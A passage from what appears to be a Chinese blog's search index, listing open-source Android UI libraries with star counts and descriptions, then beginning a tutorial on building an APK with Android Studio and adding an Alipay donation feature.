[AndroidPdfViewer](https://github.com/barteksc/AndroidPdfViewer) ★1978 - Android中显示PDF文档的库 \n- [SlidingTutorial-Android](https://github.com/Cleveroad/SlidingTutorial-Android) ★1894 - Android滑动引导页库 \n- [Highlight](https://github.com/hongyangAndroid/Highlight) ★1854 - app指向性功能高亮的库 \n- [MaterialShowcaseView](https://github.com/deano2390/MaterialShowcaseView) ★1793 - MD主题的ShowcaseView \n- [MaterialIntroView](https://github.com/iammert/MaterialIntroView) ★1732 - 给 Android 应用添加用户引导 \n- [material-intro](https://github.com/HeinrichReimer/material-intro) ★1178 - 简单的MD风格的应用介绍页 \n- [Tutors](https://github.com/Popalay/Tutors) ★75 - 种显示用户界面教程 \n- [XAnimLayout](https://github.com/limedroid/XAnimLayout) ★18 - 轻松实现引导页动画 \n\n## Popup \n\n- [BubbleLayout](https://github.com/MasayukiSuda/BubbleLayout) ★548 - 气泡文字框 \n- [BubbleView](https://github.com/cpiz/BubbleView) ★494 - 带箭头的Android气泡控件/容器类 \n- [CustomPopwindow](https://github.com/pinguo-zhouwei/CustomPopwindow) ★243 - PopupWindow 的常用API封装 \n\n## 滑动返回 \n\n- [Slidr](https://github.com/r0adkll/Slidr) ★1437 - 滑动消失功能 \n- [SwipeBack](https://github.com/liuguangqiang/SwipeBack) ★1095 - 使用手势完成Activity \n- [SwipeBackHelper](https://github.com/Jude95/SwipeBackHelper) ★993 - 仿微信下级activity联动效果 \n- [and_swipeback](https://github.com/XBeats/and_swipeback) ★752 - 利用滑动手势退出当前Activity \n- [BGASwipeBackLayout-Android](https://github.com/bingoogolapple/BGASwipeBackLayout-Android) ★676 - 实现滑动返回布局 \n- [SlideBack](https://github.com/oubowu/SlideBack) ★676 - 高仿微信视差手势滑动返回库 \n- [SwipeBack](https://github.com/sockeqwe/SwipeBack) ★608 - 滑动回退功能 \n- [SwipeBackFragment](https://github.com/YoKeyword/SwipeBackFragment) ★329 - 滑动Fragment或Activity边缘拖动返回 \n- [KugouLayout](https://github.com/zhaozhentao/KugouLayout) ★295 - 模仿酷狗播放器滑动返回的layout \n- [EdgeSlidingBack](https://github.com/GeeJoe/EdgeSlidingBack) ★116 - 一个仿ios边缘右滑返回的库 \n\n## TV组件 \n\n- [TVSample](https://github.com/hejunlin2013/TVSample) ★541 - 仿泰捷视频最新TV版 Metro UI \n- [LivePlayback](https://github.com/hejunlin2013/LivePlayback) ★468 - Android TV直播电视节目 \n- [TvWidget](https://github.com/evilbinary/TvWidget) ★293 - tv常用效果控件 \n- [CustomTvRecyclerView](https://github.com/songwenju/CustomTvRecyclerView) ★43 - 针对Android Tv Launcher页的recyclerView \n- [EpisodeListView](https://github.com/hejunlin2013/EpisodeListView) ★24 - Android剧集列表控件 \n\n## 软键盘 \n\n- [JKeyboardPanelSwitch](https://github.com/Jacksgong/JKeyboardPanelSwitch) ★2111 - 键盘面板冲突及布局闪动处理方案 \n- [InputMethodHolder](https://github.com/pqpo/InputMethodHolder) ★281 - 监听系统软键盘的状态 \n- [HideKeyboard](https://github.com/yingLanNull/HideKeyboard) ★210 - 自动隐藏软键盘 \n- [FloatingKeyboard](https://github.com/GeorgeArgyrakis/FloatingKeyboard) ★89 - 浮动可拖拽的KeyboardView \n- [SmoothInputLayout](https://github.com/AlexMofer/SmoothInputLayout) ★50 - 仿微信式平滑输入面板 \n- [SoftKeyboardUtil](https://github.com/zybieku/SoftKeyboardUtil) ★44 - 一行代码实现Android软键盘和EditText各种交互 \n- [KeyHide](https://github.com/Hamadakram/KeyHide) ★33 - 隐藏Android键盘的简单方法 \n- [keyboard-dismisser](https://github.com/GabrielSamojlo/keyboard-dismisser) ★32 - 点击任何键盘外的部分来取消键盘 \n- [KeyboardView](https://github.com/GitPhoenix/KeyboardView) ★22 - 自定义安全键盘 \n\n## 状态栏 \n\n- [StatusBarUtil](https://github.com/laobie/StatusBarUtil) ★3326 - 为Android应用设置状态栏 \n- [StatusBarCompat](https://github.com/niorgai/StatusBarCompat) ★1297 - Android 沉浸式状态栏 \n- [FlycoSystemBar](https://github.com/H07000223/FlycoSystemBar) ★857 - SystemBar助手 \n- [ImmersionBar](https://github.com/gyf-dev/ImmersionBar) ★853 - android沉浸式实现 \n\n## StepView \n\n- [StepView](https://github.com/baoyachi/StepView) ★2502 - 步骤指示器 \n- [stepper-indicator](https://github.com/badoualy/stepper-indicator) ★1039 - 引导步骤指示器 \n- [android-material-stepper](https://github.com/stepstone-tech/android-material-stepper) ★974 - 在Android应用中使用MD步进 \n- [Steppers](https://github.com/drozdzynski/Steppers) ★714 - Android步骤视图库 \n- [BreadcrumbsView](https://github.com/VictorAlbertos/BreadcrumbsView) ★565 - 显示给定序列的当前步骤 \n- [Android-SnappingStepper](https://github.com/saiwu-bigkoo/Android-SnappingStepper) ★198 - 漂亮的增减数字控制UI控件 \n- [StepView](https://github.com/zhangxuyang321/StepView) ★170 - 横向版和竖向版步骤视图 \n- [StateProgressView](https://github.com/liuhaizhu/StateProgressView) ★12 - 显示网购物流信息等进度的android view \n\n## 表格(Table) \n\n- [excelPanel](https://github.com/zhouchaoyuan/excelPanel) ★1305 - 仿Excel表格的RecyclerView \n- [ScrollablePanel](https://github.com/Kelin-Hong/ScrollablePanel) ★1265 - 二维RecyclerView \n- [AdaptiveTableLayout](https://github.com/Cleveroad/AdaptiveTableLayout) ★1144 - 读取和写入CSV文件 \n- [SortableTableView](https://github.com/ISchwarz23/SortableTableView) ★730 - 提供TableView和SortableTableView的安卓库 \n- [TableFixHeaders](https://github.com/InQBarna/TableFixHeaders) ★665 - 带有标题的表格的安卓部件 \n- [BiDirTable](https://github.com/lungerWang/BiDirTable) ★31 - 可双向滑动的表格 \n- [LockTableView](https://github.com/RmondJone/LockTableView) ★19 - Android自定义表格 \n- [HVScrollListView](https://github.com/andjdk/HVScrollListView) ★6 - 实现横纵滑动的列表控件 \n\n## 滚动视差(Parallex) \n\n- [Parallax-Layer-Layout](https://github.com/SchibstedSpain/Parallax-Layer-Layout) ★761 - Android分层视差效果 \n- [ParallaxEverywhere](https://github.com/Narfss/ParallaxEverywhere) ★620 - 视差效果的另类Android视图库 \n- [ScrollParallaxImageView](https://github.com/gjiazhe/ScrollParallaxImageView) ★402 - 滚动视差效果 \n- [linkScrollMsky](https://github.com/AndroidMsky/linkScrollMsky) ★65 - 仿知乎个人主页渐隐嵌套滑动 \n- [ParallaxViewPager](https://github.com/demoNo/ParallaxViewPager) ★63 - 带视差效果的简单ViewPager \n\n## SideBar \n\n- [RecyclerViewFastScroller](https://github.com/danoz73/RecyclerViewFastScroller) ★887 - 连接到RecyclerView实现快速滚动 \n- [SideBar](https://github.com/kongnanlive/SideBar) ★764 - 全新的快速索引导航栏 \n- [WaveSideBar](https://github.com/Solartisan/WaveSideBar) ★750 - 快速跳跃分组的侧边栏控件 \n- [WaveSideBar](https://github.com/gjiazhe/WaveSideBar) ★700 - 波浪效果索引侧边栏 \n- [FastScroll](https://github.com/L4Digital/FastScroll) ★532 - 类似列表视图的FastScroller \n- [Android-QuickSideBar](https://github.com/saiwu-bigkoo/Android-QuickSideBar) ★399 - 快速查阅对应分组的侧边栏 \n\n## 关于页面 \n\n- [AboutLibraries](https://github.com/mikepenz/AboutLibraries) ★1780 - 提供库信息的库 \n- [Android About Page](https://github.com/medyo/android-about-page) ★1257 - 快速创建独一无二的About页面 \n- [MaterialAbout](https://github.com/jrvansuita/MaterialAbout) ★829 - 显示一个MD风格的about页面 \n- [material-about-library](https://github.com/daniel-stoneuk/material-about-library) ★769 - 为app轻松创建关于页面 \n- [about-page](https://github.com/drakeet/about-page) ★95 - 基于MultiType的about页面 \n- [LSettingView](https://github.com/leonHua/LSettingView) ★48 - 设置界面条目封装 \n\n## 详情页 \n\n- [SlideDetailsLayout](https://github.com/cnbleu/SlideDetailsLayout) ★264 - 上拉加载图文详情功能 \n- [DragScrollDetailsLayout](https://github.com/happylishang/DragScrollDetailsLayout) ★248 - 仿淘宝京东蘑菇街商品详情页 \n- [GoodsInfoPage](https://github.com/hexianqiao3755/GoodsInfoPage) ★206 - 仿京东天猫app的商品详情页 \n- [LongPressPopup](https://github.com/RiccardoMoro/LongPressPopup) ★193 - 长按显示详细信息 \n- [article-android](https://github.com/klinker41/article-android) ★91 - 以可读格式显示web文章 \n- [NewsDetail](https://github.com/iceAnson/NewsDetail) ★66 - 仿今日头条详情页实现 \n- [WdjAppDetail](https://github.com/chenpengfei88/WdjAppDetail) ★45 - 仿豌豆荚应用列表跳转详情界面特效 \n- [TwoPageLayout](https://github.com/LineChen/TwoPageLayout) ★15 - 仿淘宝商品详情页 \n\n## FAB \n\n- [FloatingActionButton](https://github.com/Clans/FloatingActionButton) ★3237 - 浮动动作按钮 \n- [material-sheet-fab](https://github.com/gowong/material-sheet-fab) ★1259 - 实现浮动操作按钮的库 \n- [FabOptions](https://github.com/JoaquimLey/FabOptions) ★820 - 多功能自定义FAB组件 \n- [Floating-Navigation-View](https://github.com/andremion/Floating-Navigation-View) ★806 - 浮动菜单显示锚导航视图 \n- [FabTransitionLayout](https://github.com/bowyer-app/FabTransitionLayout) ★429 - 浮动操作按钮转换 \n- [SquareMenu](https://github.com/devsideal/SquareMenu) ★406 - 可自定义的浮动动作按钮 \n- [CounterFab](https://github.com/andremion/CounterFab) ★374 - 在右上角显示一个计数器的标记 \n\n## Indicator \n\n- [SpringIndicator](https://github.com/chenupt/SpringIndicator) ★1879 - 仿MorningRoutine引导的指示器 \n- [AndroidRubberIndicator](https://github.com/LyndonChin/AndroidRubberIndicator) ★1405 - ViewPager的rubber指示器 \n- [MusicIndicator](https://github.com/Taishi-Y/MusicIndicator) ★268 - Music indicator \n- [EasyIndicator](https://github.com/LuckSiege/EasyIndicator) ★51 - 简单的tab指示器 \n\n## 分享组件 \n\n- [ShareUtil](https://github.com/shaohui10086/ShareUtil) ★851 - 综合性的分享及登录工具库 \n- [ShareButton](https://github.com/kayan1990/ShareButton) ★452 - 一个具有流畅动画的分享按钮 \n- [GeneratePicture](https://github.com/zhangke3016/GeneratePicture) ★133 - 选取页面内容生成精美分享图片 \n\n## 升级更新 \n\n- [update](https://github.com/czy1121/update) ★936 - 清晰灵活简单易用的应用更新库 \n- [UpdatePlugin](https://github.com/yjfnypeu/UpdatePlugin) ★698 - 自由定制的app更新组件 \n- [android-auto-update](https://github.com/feicien/android-auto-update) ★544 - 安卓应用自动更新库 \n- [AppUpdate](https://github.com/fccaikai/AppUpdate) ★106 - Android 检查更新库 \n- [BGAUpdate-Android](https://github.com/bingoogolapple/BGAUpdate-Android) ★93 - 应用更新功能 \n- [CheckUpdateLibrary](https://github.com/qiangxi/CheckUpdateLibrary) ★76 - Android专用检查软件更新的库 \n- [BackgroundUpdate](https://github.com/wenwenwen888/BackgroundUpdate) ★36 - 后台更新APP \n\n## Toolbar \n\n- [FloatingToolbar](https://github.com/rubensousa/FloatingToolbar) ★1143 - FloatingActionButton变形而来的工具栏 \n- [morphy-toolbar](https://github.com/badoualy/morphy-toolbar) ★968 - 切换fragments的精致过渡动画 \n- [material-cab](https://github.com/afollestad/material-cab) ★759 - 自定义的灵活上下文活动栏 \n- [ByeBurger](https://github.com/githubwing/ByeBurger) ★746 - 极其简便的快速实现隐藏标题栏和导航栏 \n- [android-animated-menu-items](https://github.com/adonixis/android-animated-menu-items) ★696 - toolbar中动画菜单条目的示例 \n- [AwesomeBar](https://github.com/florent37/AwesomeBar) ★504 - 优美的侧边工具菜单 \n- [CollapsingToolbar-With-Webview](https://github.com/RameshBhupathi/CollapsingToolbar-With-Webview) ★190 - 带有可折叠toolbar的Webview \n- [SlideshowToolbar](https://github.com/JuL1205/SlideshowToolbar) ★188 - 安卓Slideshow Toolbar \n- [CustomTitileBar](https://github.com/xiaohaibin/CustomTitileBar) ★38 - 通用Android标题栏控件 \n\n## Sort&Drag \n\n- [DynamicGrid](https://github.com/askerov/DynamicGrid) ★805 - Android可拖拽GridView \n- [SortableTableView](https://github.com/ISchwarz23/SortableTableView) ★730 - 提供TableView和SortableTableView的安卓库 \n- [ClassifyView](https://github.com/AlphaBoom/ClassifyView) ★306 - 拖拽合并的RecyclerView \n- [android-drag-square](https://github.com/SwiftyWang/android-drag-square) ★213 - 编辑个人资料及图片可拖拽排序 \n\n## Emoji \n\n- [emojicon](https://github.com/rockerhieu/emojicon) ★2767 - Android中实现emojis表情 \n- [EmojiRain](https://github.com/Luolc/EmojiRain) ★510 - 小巧的Android掉emoji表情包实现 \n- [android-EmojiCompat](https://github.com/googlesamples/android-EmojiCompat) ★313 - EmojiCompat支持库使用样例 \n\n## Label \n\n- [labelview](https://github.com/linger1216/labelview) ★1366 - 轻松实现视图之上的标签 \n- [TriangleLabelView](https://github.com/shts/TriangleLabelView) ★587 - 显示三角视图 \n- [AvatarLabelView](https://github.com/yanbober/AvatarLabelView) ★424 - 可配置的迷你版轻量级 Label 辅助类 \n- [LabelLayout](https://github.com/luxiliu/LabelLayout) ★38 - 在另一个视图顶部显示标签文本 \n\n## WheelView \n\n- [WheelView-Android](https://github.com/lantouzi/WheelView-Android) ★875 - 具有轮视图的选择器 \n- [HorizontalWheelView](https://github.com/shchurov/HorizontalWheelView) ★815 - 供用户输入的模型水平轮控制器 \n- [WheelView](https://github.com/LukeDeighton/WheelView) ★705 - 实现一个可旋转的轮盘 \n- [androidWheelView](https://github.com/weidongjian/androidWheelView) ★611 - 仿照iOS的滚轮控件 \n- [CursorWheelLayout](https://github.com/BCsl/CursorWheelLayout) ★497 - 把视图放到一个可旋转轮子中 \n\n## PinCode \n\n- [PatternLockView](https://github.com/aritraroy/PatternLockView) ★1236 - MD风格的Android解锁视图 \n- [LolliPin](https://github.com/OrangeGangsters/LolliPin) ★1159 - MD风格的Android的PIN码库 \n- [PinLockView](https://github.com/aritraroy/PinLockView) ★801 - PIN锁自定义视图 \n- [Pinview](https://github.com/GoodieBag/Pinview) ★414 - Android的Pinview库 \n- [PasscodeView](https://github.com/hanks-zyh/PasscodeView) ★203 - Android查看视图 \n- [PasscodeView](https://github.com/kevalpatel2106/PasscodeView) ★150 - 轻松安全的验证用户 \n- [EasyGestureUnlock](https://github.com/huzenan/EasyGestureUnlock) ★26 - 轻量级手势解锁视图 \n\n## CoordinatorLayout \n\n- [CoordinatorBehaviorExample](https://github.com/saulmm/CoordinatorBehaviorExample) ★2037 - 仿Hangouts4简介动画 \n- [TabbedCoordinatorLayout](https://github.com/vitovalov/TabbedCoordinatorLayout) ★668 - 演示CoordinatorLayout的示例项目 \n- [android-ConstraintLayoutExamples](https://github.com/googlesamples/android-ConstraintLayoutExamples) ★376 - 展示ContraintLayout的特性和使用 \n- [SharePanel](https://github.com/architjn/SharePanel) ★49 - 显示分享按钮面板 \n- [collapsingtoolbarlayout](https://github.com/Liuncoolman/collapsingtoolbarlayout) ★15 - 可滑动悬浮式顶部导航栏 \n\n## 页面切换 \n\n- [TransitionPlayer](https://github.com/linfaxin/TransitionPlayer) ★1147 - 控制过渡动画的Android库 \n- [android-PageFlip](https://github.com/eschao/android-PageFlip) ★1126 - 3D风格页面翻页 \n- [EasyFlipView](https://github.com/wajahatkarim3/EasyFlipView) ★663 - 快速而简单的翻转视图 \n- [magellan](https://github.com/wealthfront/magellan) ★350 - 最简单的Android导航库 \n- [TranslationCompat](https://github.com/zhangke3016/TranslationCompat) ★150 - 动画过渡兼容库 \n\n## 悬浮窗 \n\n- [FloatUtil](https://github.com/liuguangli/FloatUtil) ★157 - 简单的浮窗工具 \n- [NetSpeed](https://github.com/mrrobot97/NetSpeed) ★35 - 悬浮窗网速显示计 \n\n## 地图 \n\n- [MapView](https://github.com/onlylemi/MapView) ★493 - 室内地图视图 \n- [DrawRouteMaps](https://github.com/ar-android/DrawRouteMaps) ★161 - 路线地图功能 \n- [ThemedGoogleMap](https://github.com/jineshfrancs/ThemedGoogleMap) ★160 - 创建带自定义主题的GoogleMap的实用类 \n- [android-togetherMap](https://github.com/yipianfengye/android-togetherMap) ★32 - 高德地图的marker聚合功能 \n\n## 编辑器 \n\n- [MarkdownView](https://github.com/falnatsheh/MarkdownView) ★725 - Android的Markdown \n- [MarkdownView](https://github.com/tiagohm/MarkdownView) ★578 - 显示Markdown文本的Android库 \n- [SortRichEditor](https://github.com/Hitomis/SortRichEditor) ★285 - 图文混合编辑的富文本编辑器 \n- [CodeView](https://github.com/tiagohm/CodeView) ★130 - Android 代码高亮 \n\n## SeekBar \n\n- [PreviewSeekBar](https://github.com/rubensousa/PreviewSeekBar) ★1915 - 显示视频预览的SeekBar \n- [BubbleSeekBar](https://github.com/woxingxiao/BubbleSeekBar) ★911 - 自定义SeekBar \n- [RangeSeekBar](https://github.com/Jay-Goo/RangeSeekBar) ★121 - 可双向范围选择的SeekBar \n- [HueSeekBar](https://github.com/iammert/HueSeekBar) ★45 - 来自Philips Hue app灵感的SeekBar \n- [RangeSeekBar](https://github.com/Brioal/RangeSeekBar) ★26 - 定值范围选择控件 \n\n## DownloadView \n\n- [GADownloading](https://github.com/Ajian-studio/GADownloading) ★733 - 创意下载进度条 \n- [FreshDownloadView](https://github.com/dudu90/FreshDownloadView) ★618 - 显示一个动画下载进程 \n- [360DownLoadView](https://github.com/Metal626/360DownLoadView) ★30 - 仿360市场下载按钮 \n\n## 其他 \n\n- [Shimmer](https://github.com/facebook/Shimmer) ★7857 - 闪光效果插件 \n- [Android Bootstrap](https://github.com/Bearded-Hen/Android-Bootstrap) ★5987 - Bootstrap风格安卓主题 \n- [litho](https://github.com/facebook/litho) ★3481 - 创建Android高效UI \n- [flow](https://github.com/square/flow) ★2269 - 命名UI状态 \n- [ENViews](https://github.com/codeestX/ENViews) ★1464 - 华丽丽的动效控件库 \n- [QuickReturn](https://github.com/lawloretienne/QuickReturn) ★1464 - 展示QuickReturn UI 模块 \n- [FloatingView](https://github.com/UFreedom/FloatingView) ★1186 - 使目标视图漂浮在锚视图上 \n- [SmoothCheckBox](https://github.com/andyxialm/SmoothCheckBox) ★1073 - Android带动画的自定义CheckBox \n- [ArcLayout](https://github.com/ogaclejapan/ArcLayout) ★1033 - 非常简单的arc布局库 \n- [android-PictureInPicture](https://github.com/googlesamples/android-PictureInPicture) ★1017 - 演示手持设备画中画模式 \n- [CouponView](https://github.com/dongjunkun/CouponView) ★1009 - 优惠券效果 \n- [Crescento](https://github.com/developer-shivam/Crescento) ★902 - 图像视图和相关布局的下面添加曲线 \n- [BigBang](https://github.com/baoyongzhang/BigBang) ★902 - 仿了Smartisan OS 的 BigBang 功能 \n- [ScratchView](https://github.com/sharish/ScratchView) ★868 - 仿刮刮卡视图 \n- [ChromeLikeTabSwitcher](https://github.com/michael-rapp/ChromeLikeTabSwitcher) ★781 - 标签切换器 \n- [ParticleTextView](https://github.com/Yasic/ParticleTextView) ★774 - 用粒子动画显示文字的 Android 自定义 View \n- [Android-ExpandIcon](https://github.com/zagum/Android-ExpandIcon) ★739 - Google风格上下箭头的简单自定义实现 \n- [android-snowfall](https://github.com/JetradarMobile/android-snowfall) ★728 - 安卓Snowfall View的全自定义实现 \n- [StickerView](https://github.com/wuapnjie/StickerView) ★724 - 贴纸视图的缩放拖动翻转删除 \n- [QQBubbleView](https://github.com/Yasic/QQBubbleView) ★723 - 仿QQ空间直播礼物冒泡特效 \n- [FloatingView](https://github.com/recruit-lifestyle/FloatingView) ★714 - 显示悬浮窗效果 \n- [Isometric](https://github.com/FabianTerhorst/Isometric) ★703 - 安卓图形库 \n- [MathView](https://github.com/kexanie/MathView) ★689 - 在Android应用中显示数学公式 \n- [PathAnimView](https://github.com/mcxtzhang/PathAnimView) ★675 - 用于做Path动画的自定义View \n- [3dTagCloudAndroid](https://github.com/misakuo/3dTagCloudAndroid) ★668 - 将一组View展示为一个3D球形集合 \n- [Squint](https://github.com/IntruderShanky/Squint) ★639 - 提供视图的对角线裁剪 \n- [GABottleLoading](https://github.com/Ajian-studio/GABottleLoading) ★635 - 贝塞尔风暴 \n- [FogView_Library](https://github.com/dynamitechetan/FogView_Library) ★586 - 安卓雾气视图库 \n- [Tangram-Android](https://github.com/alibaba/Tangram-Android) ★585 - 动态化构建Native页面的框架 \n- [Depth](https://github.com/florent37/Depth) ★571 - 在fragments中添加Depth \n- [LoopRotarySwitch](https://github.com/dalong982242260/LoopRotarySwitch) ★561 - 3d旋转切换view \n- [ScrollNumber](https://github.com/a-voyager/ScrollNumber) ★554 - 简单优雅易用的滚动数字控件 \n- [DrawView](https://github.com/ByoxCode/DrawView) ★548 - 提供涂鸦功能 \n- [tooltips](https://github.com/tomergoldst/tooltips) ★532 - 在任何视图上添加工具提示 \n- [PolygonDrawingUtil](https://github.com/stkent/PolygonDrawingUtil) ★527 - 在canvas上绘制规则多边形 \n- [Android-Coverflow](https://github.com/crosswall/Android-Coverflow) ★507 - 漂亮的Android封面浏览 \n- [android-combination-avatar](https://github.com/kongnanlive/android-combination-avatar) ★503 - 模仿QQ讨论组组合头像 \n- [Android-DragDismissActivity](https://github.com/klinker24/Android-DragDismissActivity) ★495 - 滑动取消Activity \n- [LyricViewDemo](https://github.com/zhengken/LyricViewDemo) ★494 - 强大灵活的歌词视图 \n- [ZDepthShadow](https://github.com/ShogoMizumoto/ZDepthShadow) ★487 - MD风格的安卓拉直深入阴影 \n- [EasyCountDownTextureView](https://github.com/CaMnter/EasyCountDownTextureView) ★453 - 使用TextureView轻松实现倒计时 \n- [TContributionsView](https://github.com/barryhappy/TContributionsView) ★436 - 显示类似github贡献度的View \n- [LayoutSwitch](https://github.com/gjiazhe/LayoutSwitch) ★429 - 列表布局与网格布局的切换 \n- [AppIconNameChanger](https://github.com/myinnos/AppIconNameChanger) ★397 - 动态的改变安卓应用Icon和名称 \n- [FreeDrawView](https://github.com/RiccardoMoro/FreeDrawView) ★365 - 一个可以自由涂鸦的视图 \n- [ImageCoverFlow](https://github.com/dolphinwang/ImageCoverFlow) ★340 - 图片封面浏览效果 \n- [WJMagicCurveView](https://github.com/wingjay/WJMagicCurveView) ★307 - 神奇的魔法曲线 \n- [AndroidShortcuts](https://github.com/pcevikogullari/AndroidShortcuts) ★302 - 快捷方式示例app \n- [VerificationCodeView](https://github.com/Freshman111/VerificationCodeView) ★301 - 动态生成验证码 \n- [ShimmerLayout](https://github.com/team-supercharge/ShimmerLayout) ★296 - 高效的闪光效果 \n- [LBehavior](https://github.com/Lauzy/LBehavior) ★290 - 简单实现标题栏导航栏滑动动画 \n- [Lemniscate](https://github.com/vlad1m1r990/Lemniscate) ★290 - 制作别致的进度视图 \n- [tab-digit](https://github.com/xenione/tab-digit) ★279 - 一个Flip Clock 库 \n- [EdgeTranslucent](https://github.com/qinci/EdgeTranslucent) ★278 - 任意View边沿渐变透明 \n- [FallingView](https://github.com/DingMouRen/FallingView) ★252 - 实现碎片飘落效果的控件 \n- [ClearScreenHelper](https://github.com/Yellow5A5/ClearScreenHelper) ★250 - 清屏相关的需求 \n- [DashboardView](https://github.com/woxingxiao/DashboardView) ★247 - 安卓自定义仪表盘View \n- [GooView](https://github.com/smartbetter/GooView) ★245 - 一个自定义粘性控件 \n- [CrazyShadow](https://github.com/Hitomis/CrazyShadow) ★226 - 为 View 添加阴影效果 \n- [jellyball](https://github.com/ImmortalZ/jellyball) ★226 - 高仿 path下拉小球 \n- [CompositionAvatar](https://github.com/YiiGuxing/CompositionAvatar) ★221 - 仿QQ讨论组头像 \n- [ChanelView](https://github.com/developer-shivam/ChanelView) ★202 - 说明手势的简单用例 \n- [FloatingViewService](https://github.com/hanbaokun/FloatingViewService) ★201 - 一个服务开启悬浮球 \n- [SimpleOneStep](https://github.com/gavinliu/SimpleOneStep) ★190 - 仿OneStep \n- [ShoppingCart](https://github.com/ChyengJason/ShoppingCart) ★184 - 仿饿了么购物车效果 \n- [FreeView](https://github.com/jcmore2/FreeView) ★181 - 浮动视图 \n- [FloatView](https://github.com/AlexLiuSheng/FloatView) ★172 - 类似来电秀的效果 \n- [EasyTransition](https://github.com/huzenan/EasyTransition) ★169 - 一个轻量级的共享元素迁移库 \n- [UnifiedContactPicker](https://github.com/quiin/UnifiedContactPicker) ★153 - 统一用户联系人 \n- [DragFooterView](https://github.com/uin3566/DragFooterView) ★144 - 向左拖拽跳转至更多页面 \n- [FloatBall](https://github.com/HalfStackDeveloper/FloatBall) ★144 - 高仿flyme悬浮球 \n- [AndroidGpsStatus](https://github.com/hzw1199/AndroidGpsStatus) ★139 - 显示GPS状态和信号强度 \n- [WindView](https://github.com/AhmadNemati/WindView) ★135 - 显示天气风速和压力状态 \n- [AttributesDispatcher](https://github.com/pavel163/AttributesDispatcher) ★111 - 创建一个自定义视图 \n- [SnapHelperExample](https://github.com/MindorksOpenSource/SnapHelperExample) ★104 - SnapHelper的Android示例 \n- [XyzInfo](https://github.com/zhangxuyang321/XyzInfo) ★92 - 自定义Switch和Ruler控件 \n- [MagicLine](https://github.com/zhangyuChen1991/MagicLine) ★85 - 简单的规律绘制直线构造神奇的视觉效果 \n- [Lamp](https://github.com/stewForAni/Lamp) ★81 - 简单的Android工艺灯控件 \n- [WaitView](https://github.com/ImKarl/WaitView) ★80 - 显示等待加载状态的View \n- [Vibes](https://github.com/hugeinc/Vibes) ★76 - 安卓的径向传播背景 \n- [VerificationCodeInput](https://github.com/liuguangli/VerificationCodeInput) ★72 - 简洁验证码输入框 \n- [PayUI](https://github.com/a5533348/PayUI) ★70 - 支付密码弹出层 \n- [Android-RadarView](https://github.com/jeanboydev/Android-RadarView) ★64 - 仿支付宝芝麻分解读 \n- [FlipperView](https://github.com/JuniperPhoton/FlipperView) ★61 - 使用翻转过渡改变不同状态 \n- [HorizontalNumberView](https://github.com/ruzhan123/HorizontalNumberView) ★61 - 简单的Android滑动缩放视图 \n- [ShelfView](https://github.com/tdscientist/ShelfView) ★59 - 显示书架上的书的自定义视图 \n- [GithubContributionsWidget](https://github.com/donglua/GithubContributionsWidget) ★56 - github贡献的Android部件 \n- [ElasticViews](https://github.com/skydoves/ElasticViews) ★49 - 触摸动画Android视图 \n- [EasyFeedback](https://github.com/webianks/EasyFeedback) ★47 - 收集Android应用程序的反馈 \n- [PixelSlide](https://github.com/hearsilent/PixelSlide) ★47 - 上下的展开箭头扩展示例 \n- [RuleView](https://github.com/panacena/RuleView) ★47 - 自定义刻度尺控件 \n- [PaintView](https://github.com/LiuHongtao/PaintView) ★43 - 在图片上涂鸦 \n- [NetMonitor](https://github.com/GHdeng/NetMonitor) ★43 - 使用广播监听网络变化 \n- [StickyDemo](https://github.com/wobiancao/StickyDemo) ★41 - 三步实现控件悬浮 \n- [DigitSpeedView](https://github.com/capur16/DigitSpeedView) ★39 - 独特的安卓数字测速仪 \n- [checkview](https://github.com/cdflynn/checkview) ★37 - 动画check标记 \n- [FlipLayout](https://github.com/cmfsotelo/FlipLayout) ★36 - 容易的对ViewGroup的子View进行交换 \n- [Particle](https://github.com/JadynAi/Particle) ★33 - 一个android萤火虫飞舞的粒子效果 \n- [BubbleView](https://github.com/simplepeng/BubbleView) ★30 - 模仿QQ水泡拖拽效果 \n- [CircleRangeView](https://github.com/WangGanxin/CircleRangeView) ★29 - 自定义圆形仪表盘View \n- [StatusBarFits](https://github.com/ghnor/StatusBarFits) ★25 - Android状态栏 \n- [HoverView](https://github.com/fashare2015/HoverView) ★23 - 仿知乎的底部抽屉 \n- [AndroidHeatMap](https://github.com/HeartlandSoftware/AndroidHeatMap) ★23 - 易于使用的热点图控件 \n- [VerificationCodeView](https://github.com/yongming9011/VerificationCodeView) ★22 - Android简单的验证码控件 \n- [MultiShapeView](https://github.com/msandroid/MultiShapeView) ★20 - 支持圆角矩形圆形自定义View \n- [WeekView](https://github.com/cooldev727/WeekView) ★18 - 安卓周视图 \n- [LetterView](https://github.com/dengzq/LetterView) ★12 - 选中字母完成单词 \n\n","tags":["开源","Android","github"],"categories":["代码笔记"]},{"title":"3分钟轻松学会编译安卓 APK","url":"/2017/07/30/3分钟轻松学会编译安卓-APK/","content":"![](/img/https://developer.coolapk.com.png)\n\n简单说下，如何快速利用别人的开源项目快速编译一个apk。通过阅读优秀的开源项目源码，学习优秀的设计思路。提高自己的编码能力！编程高手的必经之路-----从学会阅读别人的代码开始！\n好了，让我们马上开始把！\n\n<!-- more -->\n\n> ### 开发环境搭建\n\n* #### 1. 安装 Android Studio\n\n![android-studio.org](http://www.android-studio.org/images/news/3.0.1/16-apk.jpg)\n\n[Windows下载地址](https://dl.google.com/dl/android/studio/install/2.3.3.0/android-studio-bundle-162.4069837-windows.exe) **包含 Android SDK（推荐）**\n\n[Linux下载地址](https://dl.google.com/dl/android/studio/ide-zips/2.3.3.0/android-studio-ide-162.4069837-linux.zip) **不包含 Android SDK（需翻墙）**\n\n* #### 2. 安装 JDK\n\n[Windows 64位 下载地址](https://pan.baidu.com/s/1kTJYRXH)\n[Linux 下载地址](https://pan.baidu.com/s/1cr4say)\n\n\n* #### 3. 下载示例项目\n\n[妹子图开源代码](https://github.com/Surine/MaterialTest.git)\n\n> ### 导入项目到 Android Studio\n\n#### 1. 如图所示\n\n1. 点击 Open existing Android Studio Project\n\n![](http://oss.gkstk.com/images/2017/2/28175446522.jpg)\n\n2. 选择刚刚我们下载的示例项目\n\n![](http://ask.android-studio.org/uploads/article/20141216/ba22322003c96708ccfd3222e58fec22.png?_=4183012)\n\n> ### 添加支付宝捐赠功能(重要部分)\n\n#### 1. 导入支付宝 SDK 依赖库\n\n> compile 'moe.feng:AlipayZeroSdk:1.1'\n\n#### 2. 核心支付代码\n\n```\nif (AlipayZeroSdk.hasInstalledAlipayClient(AboutActivity.this)) {\n\tAlipayZeroSdk.startAlipayClient(AboutActivity.this, \"FKX02828RROAVHC0VOT05F\");\n} else {\n\tToast.makeText(AboutActivity.this, \"未安装支付宝\", 